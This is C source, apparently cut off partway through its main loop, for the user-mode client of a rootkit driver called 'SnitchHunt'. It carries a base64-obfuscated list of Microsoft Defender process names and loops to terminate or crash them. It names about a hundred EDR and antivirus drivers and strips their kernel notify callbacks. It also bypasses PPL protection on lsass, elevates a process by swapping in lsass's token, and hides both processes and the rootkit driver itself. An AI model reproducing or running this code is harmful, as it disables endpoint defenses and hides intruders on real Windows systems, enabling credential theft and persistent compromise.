
#include <windows.h>
#include <stdio.h>
#include <DbgHelp.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <wincrypt.h>

// Link with required libraries
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Dbghelp.lib")



int stop_term_thread = 0;
int stop_crash_thread = 0;

struct threadArgs {
    HANDLE hDevice;
    int mode;
};

// IOCTL base codes
#define SYSTEM_DRV 0x8000
#define IOCTL_BASE 0x800

// Helper macro to define our custom IOCTLs
#define CTL_CODE_HIDE(i) \
    CTL_CODE(SYSTEM_DRV, IOCTL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define custom IOCTL to instruct driver to crash target process
#define IOCTL_KILL_PROCESS CTL_CODE_HIDE(1)
#define IOCTL_REM_PROC_CALLBACK CTL_CODE_HIDE(2)
#define IOCTL_LIST_PROC_CALLBACK CTL_CODE_HIDE(3)
#define IOCTL_LIST_THREAD_CALLBACK CTL_CODE_HIDE(4)
#define IOCTL_REM_THREAD_CALLBACK CTL_CODE_HIDE(5)
#define IOCTL_LIST_LOAD_IMAGE_CALLBACK CTL_CODE_HIDE(6)
#define IOCTL_REM_LOAD_IMAGE_CALLBACK CTL_CODE_HIDE(7)
#define IOCTL_LIST_REG_CALLBACK CTL_CODE_HIDE(8)
#define IOCTL_REM_REG_CALLBACK CTL_CODE_HIDE(9)
#define IOCTL_REM_OBJ_CALLBACK CTL_CODE_HIDE(10)
#define IOCTL_CRASH_PROCESS CTL_CODE_HIDE(11)
#define IOCTL_PPL_BYPASS CTL_CODE_HIDE(12)
#define IOCTL_PROC_TOKEN_SWAP CTL_CODE_HIDE(13)
#define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
#define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)






#pragma warning (disable: 4996)

#define _CRT_SECURE_NO_WARNINGS


struct ModulesData {
    CHAR ModuleName[256];
    ULONG64 ModuleBase;
};


struct pplData {
    DWORD pid;
    DWORD offset;
};

struct offsets {
	DWORD ProtectionOffset;
	DWORD tokenOffset;
	DWORD ActiveProcessLinks;
};

struct ModulesDataArray {
    ModulesData* Modules;
    SIZE_T Count;
};

struct elevateProcArgs {
    DWORD pid1;
    DWORD pid2;
    int offset;
};

struct hideProcArgs {
    DWORD pid;
    DWORD offset;
};


const char* edrNames[] = {
"U2Vuc2VJUi5leGU=",                       // SenseIR.exe
"U2VjSGVhbHRoVUkuZXhl",                  // SecHealthUI.exe
"TXBEZWZlbmRlckNvcmVTZXJ2aWNlLmV4ZQ==",  // MpDefenderCoreService.exe
"c21hcnRzY3JlZW4uZXhl",                  // smartscreen.exe
"TXNNcEVuZy5leGU=",                      // MsMpEng.exe
"U2VjdXJpdHlIZWFsdGhTZXJ2aWNlLmV4ZQ==",  // SecurityHealthService.exe
"U2VjdXJpdHlIZWFsdGhTeXN0cmF5LmV4ZQ==",  // SecurityHealthSystray.exe
"TXNTZW5zZS5leGU=",                      // MsSense.exe
"U2Vuc2VOZHIuZXhl",                      // SenseNdr.exe
"U2Vuc2VUVk0uZXhl",                      // SenseTVM.exe
"TmlzU3J2LmV4ZQ=="                       // NisSrv.exe
};


// Array of driver names to monitor
const char* monitoredDrivers[] = {
    "EX64.sys", "Eng64.sys", "teefer2.sys", "teefer3.sys", "srtsp64.sys",
    "srtspx64.sys", "srtspl64.sys", "Ironx64.sys", "fekern.sys", "cbk7.sys",
    "WdFilter.sys", "cbstream.sys", "atrsdfw.sys", "avgtpx86.sys",
    "avgtpx64.sys", "naswSP.sys", "ProcessSnitch.sys", "edrsensor.sys", "CarbonBlackK.sys",
    "parity.sys", "csacentr.sys", "csaenh.sys", "csareg.sys", "csascr.sys",
    "csaav.sys", "csaam.sys", "rvsavd.sys", "cfrmd.sys", "cmdccav.sys",
    "cmdguard.sys", "CmdMnEfs.sys", "MyDLPMF.sys", "im.sys", "csagent.sys",
    "CybKernelTracker.sys", "CRExecPrev.sys", "CyOptics.sys", "CyProtectDrv32.sys",
    "CyProtectDrv64.sys", "groundling32.sys", "groundling64.sys", "esensor.sys",
    "edevmon.sys", "ehdrv.sys", "FeKern.sys", "WFP_MRT.sys", "xfsgk.sys",
    "fsatp.sys", "fshs.sys", "HexisFSMonitor.sys", "klifks.sys", "klifaa.sys",
    "Klifsm.sys", "mbamwatchdog.sys", "mfeaskm.sys", "mfencfilter.sys",
    "PSINPROC.SYS", "PSINFILE.SYS", "amfsm.sys", "amm8660.sys", "amm6460.sys",
    "eaw.sys", "SAFE-Agent.sys", "SentinelMonitor.sys", "SAVOnAccess.sys",
    "savonaccess.sys", "sld.sys", "pgpwdefs.sys", "GEProtection.sys",
    "diflt.sys", "sysMon.sys", "ssrfsf.sys", "emxdrv2.sys", "reghook.sys",
    "spbbcdrv.sys", "bhdrvx86.sys", "bhdrvx64.sys", "symevent.sys", "vxfsrep.sys",
    "VirtFile.sys", "SymAFR.sys", "symefasi.sys", "symefa.sys", "symefa64.sys",
    "SymHsm.sys", "evmf.sys", "GEFCMP.sys", "VFSEnc.sys", "pgpfs.sys",
    "fencry.sys", "symrg.sys", "ndgdmk.sys", "ssfmonm.sys", "SISIPSFileFilter.sys",
    "cyverak.sys", "cyvrfsfd.sys", "cyvrmtgn.sys", "tdevflt.sys", "tedrdrv.sys",
	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
};

typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);



BOOL Terminate(HANDLE, DWORD);
DWORD FindProcessId(const char*);
char* base64_decode(const char*);
void killer_callback(threadArgs* args);


DWORD GetWindowsBuildNumber(void) {
    RTL_OSVERSIONINFOW info = { 0 };
    info.dwOSVersionInfoSize = sizeof(info);

    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlGetVersion");

    if (pRtlGetVersion != NULL && pRtlGetVersion(&info) == 0) {
        return info.dwBuildNumber;
    }
    return 0;
}
// temporanea. prima o poi faro' con gli offset presi dai symbol file scaricati
offsets getOffsetByBuild(void) {
    DWORD build = GetWindowsBuildNumber();
    printf("Detected Windows Build: %lu\n", build);

	offsets off = { 0 };

	DWORD ProtectionOffset = 0;
	DWORD tokenOffset = 0;
	DWORD ActiveProcessLinks = 0;

    switch (build) {
    case 19041:  // Windows 10 2004
        printf("Windows 10 version 2004 detected.\n");
        tokenOffset = 0x4b8;
        ProtectionOffset = 0x87a;
        ActiveProcessLinks = 0x448;
        break;

    case 19042:  // Windows 10 20H2
        printf("Windows 10 version 20H2 detected.\n");
        tokenOffset = 0x4b8;
        ProtectionOffset = 0x87a;
        ActiveProcessLinks = 0x448;
        break;

    case 19043:  // Windows 10 21H1
        printf("Windows 10 version 21H1 detected.\n");
        tokenOffset = 0x4b8;
        ProtectionOffset = 0x87a;
        ActiveProcessLinks = 0x448;
        break;

    case 19044:  // Windows 10 21H2
        printf("Windows 10 version 21H2 detected.\n");
        tokenOffset = 0x4b8;
        ProtectionOffset = 0x87a;
        ActiveProcessLinks = 0x448;
        break;

    case 19045:  // Windows 10 22H2
        printf("Windows 10 version 22H2 detected.\n");
        tokenOffset = 0x4b8;
        ProtectionOffset = 0x87a;
        ActiveProcessLinks = 0x448;
        break;

    case 22000:  // Windows 11 21H2
        printf("Windows 11 version 21H2 detected.\n");
        tokenOffset = 0x4b8;
        ProtectionOffset = 0x87a;
        ActiveProcessLinks = 0x448;
        break;

    case 22621:  // Windows 11 22H2
        printf("Windows 11 version 22H2 detected.\n");
        tokenOffset = 0x4b8;
        ProtectionOffset = 0x87a;
        ActiveProcessLinks = 0x448;
        break;

    case 22631:  // Windows 11 23H2
        printf("Windows 11 version 23H2 detected.\n");
        tokenOffset = 0x4b8;
        ProtectionOffset = 0x87a;
        ActiveProcessLinks = 0x448;
        break;
    case 26100:
         // Windows 11 24H2
        printf("Windows 11 version 24H2 detected.\n");
        tokenOffset = 0x248;
        ProtectionOffset = 0x5fa;
        ActiveProcessLinks = 0x1d8;
		break;

    default:
        ProtectionOffset = 0x5fa;
        printf("Unknown or future Windows build: %lu\n", build);
        break;
    }
	
	off.ProtectionOffset = ProtectionOffset;
	off.tokenOffset = tokenOffset;
	off.ActiveProcessLinks = ActiveProcessLinks;

    return off;
}


// Find PID of a process by its executable name
DWORD FindProcessId(const char* processName) {

    // Convert process name to wide char for comparison
    size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
    wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
    if (!wprocessName) {
        return 0;
    }
    mbstowcs(wprocessName, processName, wcharCount);

    DWORD processId = 0;

    // Take a snapshot of all running processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        // Iterate through all processes to find a match
        if (Process32First(snapshot, &processEntry)) {
            do {
                if (wcscmp(processEntry.szExeFile, wprocessName) == 0) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }

    free(wprocessName);
    return processId;
}

// Decode Base64 encoded process name
char* base64_decode(const char* input) {
    DWORD decodedSize = 0;

    // First, get the size of decoded output
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL)) {
        fprintf(stderr, "Failed to calculate Base64 decoded size.\n");
        return NULL;
    }

    BYTE* decoded = (BYTE*)malloc(decodedSize);
    if (decoded == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        return NULL;
    }

    // Decode Base64 string into raw bytes
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, decoded, &decodedSize, NULL, NULL)) {
        fprintf(stderr, "Failed to decode Base64.\n");
        free(decoded);
        return NULL;
    }

    // Convert raw bytes to C string
    char* decodedStr = (char*)malloc(decodedSize + 1);
    if (decodedStr == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        free(decoded);
        return NULL;
    }
    memcpy(decodedStr, decoded, decodedSize);
    decodedStr[decodedSize] = '\0';

    free(decoded);
    return decodedStr;
}

BOOL Terminate(HANDLE hDevice, DWORD pid) {
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,
        &pid,
        sizeof(pid),
        NULL,
        0,
        &bytesReturned,
        NULL);
    return result;
}

BOOL CrashProc(HANDLE hDevice, DWORD pid) {
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_CRASH_PROCESS,
        &pid,
        sizeof(pid),
        NULL,
        0,
        &bytesReturned,
        NULL);
    return result;
}
void killer_callback(threadArgs* args) {

    HANDLE hDevice = args->hDevice;
    int mode = args->mode;

	int edrCount = sizeof(edrNames) / sizeof(edrNames[0]);

    while (!stop_term_thread) {
        for (size_t i = 0; i < edrCount; i++) {
            char* decodedName = base64_decode(edrNames[i]);
            if (decodedName) {
                DWORD pid = FindProcessId(decodedName);
                if (pid != 0) {
                    printf("Found EDR process: %s with PID %lu\n", decodedName, pid);
                    DWORD bytesReturned;
                    BOOL result;
                    if (mode == 1){
                        result = Terminate(hDevice, pid);
                    }
                    if (mode == 2) {
                        result = CrashProc(hDevice, pid);
                    }
                    if (result) {
                        printf("Sent crash command to process %s (PID %lu)\n", decodedName, pid);
                    }
                    else {
                        fprintf(stderr, "Failed to send crash command. Error: %lu\n", GetLastError());
                    }
                }
                free(decodedName);
            }
        }
    }
}

BOOL ListProcNotifyRoutine(HANDLE hDevice) {
    DWORD bytesReturned;
	ModulesData* resultArray = NULL;
	ULONG64 modulesCount = 0;
	BOOL result;



	resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);

    result = DeviceIoControl(
		hDevice,
        IOCTL_LIST_PROC_CALLBACK,
        NULL,
        0,
		resultArray,
        sizeof(ModulesData) * 64,
		&bytesReturned,
        NULL
	);
	if (resultArray == NULL) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
        free(resultArray);
        return FALSE;
	}
    if (bytesReturned == 0) {
        fprintf(stderr, "No data returned from driver.\n");
        free(resultArray);
        return FALSE;
	}
    for (size_t i = 0; i < 64; i++) {
        if (resultArray[i].ModuleBase == 0)
			continue;
        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
	}

    return result;
}

BOOL ElProcCallback(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;



    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);

    result = DeviceIoControl(
        hDevice,
		IOCTL_LIST_PROC_CALLBACK,
        NULL,
        0,
        resultArray,
        sizeof(ModulesData) * 64,
        &bytesReturned,
        NULL
    );
    if (resultArray == NULL) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
        free(resultArray);
        return FALSE;
    }
    if (bytesReturned == 0) {
        fprintf(stderr, "No data returned from driver.\n");
        free(resultArray);
        return FALSE;
    }
    for (size_t i = 0; i < 64; i++) {
        if (resultArray[i].ModuleBase == 0)
            continue;
		// Check if the module is in the monitored drivers list 104 is a temp number of the elements of the array
        for (size_t j = 0; j < 104; j++) {
            if (_stricmp(resultArray[i].ModuleName, monitoredDrivers[j]) == 0) {
                printf("Removing Process Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
                DWORD bytesReturnedRem;
                BOOL remResult = DeviceIoControl(
                    hDevice,
                    IOCTL_REM_PROC_CALLBACK,
                    &resultArray[i].ModuleName,
                    sizeof(resultArray[i].ModuleName),
                    NULL,
                    0,
                    &bytesReturnedRem,
                    NULL
                );
                if (remResult) {
                    printf("Successfully removed callback for %s\n", resultArray[i].ModuleName);
                }
                else {
                    fprintf(stderr, "Failed to remove callback for %s. Error: %lu\n", resultArray[i].ModuleName, GetLastError());
                }
            }
		}
        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
    }
    if (!result) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully sent request to remove process notify routine callback.\n");
	}

    return result;
}


BOOL ListThreadNotifyRoutine(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;



    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);

    result = DeviceIoControl(
        hDevice,
        IOCTL_LIST_THREAD_CALLBACK,
        NULL,
        0,
        resultArray,
        sizeof(ModulesData) * 64,
        &bytesReturned,
        NULL
    );
    if (resultArray == NULL) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
        free(resultArray);
        return FALSE;
    }
    if (bytesReturned == 0) {
        fprintf(stderr, "No data returned from driver.\n");
        free(resultArray);
        return FALSE;
    }
    for (size_t i = 0; i < 64; i++) {
        if (resultArray[i].ModuleBase == 0)
            continue;
        printf("Thread Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
    }

    return result;
}


BOOL ElThreadCallback(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;



    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);

    result = DeviceIoControl(
        hDevice,
        IOCTL_LIST_THREAD_CALLBACK,
        NULL,
        0,
        resultArray,
        sizeof(ModulesData) * 64,
        &bytesReturned,
        NULL
    );
    if (resultArray == NULL) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
        free(resultArray);
        return FALSE;
    }
    if (bytesReturned == 0) {
        fprintf(stderr, "No data returned from driver.\n");
        free(resultArray);
        return FALSE;
    }
    for (size_t i = 0; i < 64; i++) {
        if (resultArray[i].ModuleBase == 0)
            continue;
        // Check if the module is in the monitored drivers list 104 is a temp number of the elements of the array
        for (size_t j = 0; j < 104; j++) {
            if (_stricmp(resultArray[i].ModuleName, monitoredDrivers[j]) == 0) {
                printf("Removing Thread Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
                DWORD bytesReturnedRem;
                BOOL remResult = DeviceIoControl(
                    hDevice,
                    IOCTL_REM_THREAD_CALLBACK,
                    &resultArray[i].ModuleName,
                    sizeof(resultArray[i].ModuleName),
                    NULL,
                    0,
                    &bytesReturnedRem,
                    NULL
                );
                if (remResult) {
                    printf("Successfully removed callback for %s\n", resultArray[i].ModuleName);
                }
                else {
                    fprintf(stderr, "Failed to remove callback for %s. Error: %lu\n", resultArray[i].ModuleName, GetLastError());
                }
            }
        }
        printf("Thread Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
    }
    if (!result) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully sent request to remove thread notify routine callback.\n");
    }
    return result;
}


BOOL ListLoadImageNotifyRoutine(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;

    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);

    result = DeviceIoControl(
        hDevice,
        IOCTL_LIST_LOAD_IMAGE_CALLBACK,
        NULL,
        0,
        resultArray,
        sizeof(ModulesData) * 64,
        &bytesReturned,
        NULL
    );
    if (resultArray == NULL) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
        free(resultArray);
        return FALSE;
    }
    if (bytesReturned == 0) {
        fprintf(stderr, "No data returned from driver.\n");
        free(resultArray);
        return FALSE;
    }
    for (size_t i = 0; i < 64; i++) {
        if (resultArray[i].ModuleBase == 0)
            continue;
        printf("Thread Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
    }
    return result;
}

BOOL ListRegCallBack(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;
    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);
    result = DeviceIoControl(
        hDevice,
        IOCTL_LIST_REG_CALLBACK,
        NULL,
        0,
        resultArray,
        sizeof(ModulesData) * 64,
        &bytesReturned,
        NULL
    );
    //if (resultArray == NULL) {
    //    fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
    //    free(resultArray);
    //    return FALSE;
    //}
    //if (bytesReturned == 0) {
    //    fprintf(stderr, "No data returned from driver.\n");
    //    free(resultArray);
    //    return FALSE;
    //}
    //for (size_t i = 0; i < 64; i++) {
    //    if (resultArray[i].ModuleBase == 0)
    //        continue;
    //    printf("Registry Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
    //}
    return result;
}


BOOL ElLoadImageCallback(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;



    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);

    result = DeviceIoControl(
        hDevice,
        IOCTL_LIST_LOAD_IMAGE_CALLBACK,
        NULL,
        0,
        resultArray,
        sizeof(ModulesData) * 64,
        &bytesReturned,
        NULL
    );
    if (resultArray == NULL) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
        free(resultArray);
        return FALSE;
    }
    if (bytesReturned == 0) {
        fprintf(stderr, "No data returned from driver.\n");
        free(resultArray);
        return FALSE;
    }
    for (size_t i = 0; i < 64; i++) {
        if (resultArray[i].ModuleBase == 0)
            continue;
        // Check if the module is in the monitored drivers list 104 is a temp number of the elements of the array
        for (size_t j = 0; j < 104; j++) {
            if (_stricmp(resultArray[i].ModuleName, monitoredDrivers[j]) == 0) {
                printf("Removing LoadImage Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
                DWORD bytesReturnedRem;
                BOOL remResult = DeviceIoControl(
                    hDevice,
                    IOCTL_REM_LOAD_IMAGE_CALLBACK,
                    &resultArray[i].ModuleName,
                    sizeof(resultArray[i].ModuleName),
                    NULL,
                    0,
                    &bytesReturnedRem,
                    NULL
                );
                if (remResult) {
                    printf("Successfully removed callback for %s\n", resultArray[i].ModuleName);
                }
                else {
                    fprintf(stderr, "Failed to remove callback for %s. Error: %lu\n", resultArray[i].ModuleName, GetLastError());
                }
            }
        }
        printf("LoadImage Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
    }
    if (!result) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully removed loadImage notify routine callback.\n");
    }
    return result;
}


BOOL ElRegCallBack(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;

    result = DeviceIoControl(
        hDevice,
        IOCTL_REM_REG_CALLBACK,
        NULL,
        0,
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {
        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully removed registry notify routine callback.\n");
    }
    return result;
}

BOOL ElObjCallBack(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;
    result = DeviceIoControl(
        hDevice,
        IOCTL_REM_OBJ_CALLBACK,
        NULL,
        0,
        NULL,
        0,
        &bytesReturned,
        NULL
    );
    if (!result) {
        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully removed object notify routine callback.\n");
    }
    return result;
}

BOOL bypassPPL(HANDLE hDevice, DWORD pid) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;
	offsets off = getOffsetByBuild();

	DWORD offset = off.ProtectionOffset;

	pplData data;
	data.pid = pid;
	data.offset = offset;

    result = DeviceIoControl(
        hDevice,
        IOCTL_PPL_BYPASS,
        &data,
        sizeof(pplData),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
    if (!result) {
        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully sent request to bypass PPL.\n");
    }
    return result;
}

BOOL elevateProc(HANDLE hDevice, DWORD pid1, DWORD pid2) {
    BOOL result;
	DWORD bytesReturned;
	offsets off = getOffsetByBuild();

	DWORD offset = off.tokenOffset;
	elevateProcArgs data;

    //DWORD lsassPid = FindProcessId("lsass.exe");


	data.pid1 = pid1;

	data.pid2 = pid2;
	data.offset = offset;

    result = DeviceIoControl(
        hDevice,
        IOCTL_PROC_TOKEN_SWAP,
        &data,
        sizeof(elevateProcArgs),
        NULL,
        0,
        &bytesReturned,
        NULL
	);

    if (!result) {
        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully sent request to elevate process.\n");
    }
	return result;
}

BOOL hideProc(HANDLE hDevice, DWORD pid) {
    DWORD bytesReturned;
    BOOL result;

	offsets off = getOffsetByBuild();

	hideProcArgs data;
	data.pid = pid;
	data.offset = off.ActiveProcessLinks;

	printf("Using ActiveProcessLinks offset: 0x%lx\n", data.offset);



    result = DeviceIoControl(
        hDevice,
        IOCTL_UMPROC_HIDE,
        &data,
        sizeof(hideProcArgs),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
    if (!result) {
        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully sent request to hide process.\n");
    }
    return result;
}

BOOL hideRootkitDrv(HANDLE hDevice) {
    DWORD bytesReturned;
    BOOL result;
    result = DeviceIoControl(
        hDevice,
        IOCTL_UNLINK_ROOTKIT_DRV,
        NULL,
        0,
        NULL,
        0,
        &bytesReturned,
        NULL
    );
    if (!result) {
        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully sent request to unlink rootkit driver.\n");
    }
    return result;
}

int main(int argc, char* argv[])
{
    HANDLE hDevice = CreateFileA(
        "\\\\.\\SnitchHunt",                // Device name
        GENERIC_READ | GENERIC_WRITE,      // Desired access
        0,                                  // Share mode
        NULL,                               // Security attributes
        OPEN_EXISTING,                      // Creation disposition
        FILE_ATTRIBUTE_NORMAL,              // Flags and attributes
		NULL);                              // Template file

    const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
    HANDLE hTerminateThread;
	HANDLE hCrashThread;


    while (1) {
		char input[256];

		printf("> ");

		fgets(input, sizeof(input), stdin);
        if (strncmp(input, "terminate", 9) == 0) {
			stop_term_thread = 0;
            threadArgs args;
            args.hDevice = hDevice;
            args.mode = 1;
            hTerminateThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, &args, 0, NULL);
            if (hTerminateThread == NULL) {
                fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
                return 1;
			}
        }
        else if (strncmp(input, "crashem", 7) == 0) {
            stop_term_thread = 0;
            threadArgs args;
            args.hDevice = hDevice;
            args.mode = 2;
            hCrashThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, &args, 0, NULL);
            if (hCrashThread == NULL) {
                fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
                return 1;
            }
        }
        else if (strncmp(input, "exit", 4) == 0) {
            printf("Exiting...\n");
            break;
        }
        else if (strncmp(input, "stopterm", 8) == 0) {
            printf("Stopping termination...\n");
			stop_term_thread = 1;            
        }
        else if (strncmp(input, "stopcrash", 9) == 0) {
            printf("Stopping crashing...\n");
            stop_crash_thread = 1;
		}
        else if (strncmp(input, "kill", 4) == 0) {
            DWORD pid = atoi(input + 5);
            if (pid == 0) {
                printf("Invalid PID.\n");
                continue;
            }
            BOOL result = Terminate(hDevice, pid);
            if (result) {
                printf("Sent crash command to process with PID %lu\n", pid);
            }
            else {
                printf("Failed to send crash command. Error: %lu\n", GetLastError());
            }
		}
        else if (strncmp(input, "crash", 5) == 0) {
            DWORD pid = atoi(input + 6);
            if (pid == 0) {
                printf("Invalid PID.\n");
                continue;
            }
            BOOL result = CrashProc(hDevice, pid);
            if (result) {
                printf("Sent crash command to process with PID %lu\n", pid);
            }
            else {
                printf("Failed to send crash command. Error: %lu\n", GetLastError());
            }
        }
        else if (strncmp(input, "listproc", 8) == 0) {
            ListProcNotifyRoutine(hDevice);
        }

        else if (strncmp(input, "listthread", 10) == 0) {
            ListThreadNotifyRoutine(hDevice);
        }
        else if (strncmp(input, "listloadimage", 13) == 0) {
            ListLoadImageNotifyRoutine(hDevice);
        }
        else if (strncmp(input, "listreg", 7) == 0) {
            ListRegCallBack(hDevice);
		}
        else if (strncmp(input, "elproccallback", 14) == 0) {
            BOOL result = ElProcCallback(hDevice);
            if (result) {
                printf("Sent request to eliminate process notify routine callback.\n");
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
        }
        else if (strncmp(input, "elthreadcallback", 16) == 0) {
            BOOL result = ElThreadCallback(hDevice);
            if (result) {
                printf("Sent request to eliminate thread notify routine callback.\n");
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
		}
        else if (strncmp(input, "elloadimagecallback", 18) == 0) {
            BOOL result = ElLoadImageCallback(hDevice);
            if (result) {
                printf("Sent request to eliminate load image notify routine callback.\n");
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
		}
        else if (strncmp(input, "elregcallback", 13) == 0) {
            BOOL result = ElRegCallBack(hDevice);
            if (result) {
                printf("Sent request to eliminate registry notify routine callback.\n");
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
		}
        else if (strncmp(input, "elobjcallback", 13) == 0) {
            BOOL result = ElObjCallBack(hDevice);
            if (result) {
                printf("Sent request to eliminate object notify routine callback.\n");
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
        }
        else if (strncmp(input, "elall", 5) == 0) {
            BOOL result1 = ElProcCallback(hDevice);
            BOOL result2 = ElThreadCallback(hDevice);
            BOOL result3 = ElLoadImageCallback(hDevice);
			BOOL result4 = ElRegCallBack(hDevice);
			BOOL result5 = ElObjCallBack(hDevice);
            
            if (result1 && result2 && result3 && result4 && result5) {
                printf("Sent requests to eliminate all known EDR callbacks.\n");
            }
            else {
                printf("Failed to send some requests. Error: %lu\n", GetLastError());
            }
		}
        else if (strncmp(input, "bypassppllsass", 14) == 0) {
            DWORD pid = FindProcessId("lsass.exe");
            if (pid == 0) {
                printf("lsass.exe not found.\n");
                continue;
            }
            BOOL result = bypassPPL(hDevice, pid);
            if (result) {
                printf("Sent request to bypass PPL for lsass.exe with PID %lu\n", pid);
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
        }
        else if (strncmp(input, "bypassppl", 9) == 0) {
            DWORD pid = atoi(input + 10);
            if (pid == 0) {
                printf("Invalid PID.\n");
                continue;
            }
            BOOL result = bypassPPL(hDevice, pid);
            if (result) {
                printf("Sent request to bypass PPL for process with PID %lu\n", pid);
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
            }
        }
        else if (strncmp(input, "elevatelocal", 12) == 0) {
            DWORD pid = atoi(input + 13);
            if (pid == 0) {
                printf("Invalid PID.\n");
                continue;
            }
            DWORD lsassPid = FindProcessId("lsass.exe");
            if (lsassPid == 0) {
                printf("lsass.exe not found.\n");
                continue;
            }
            BOOL result = elevateProc(hDevice, pid, lsassPid);
            if (result) {
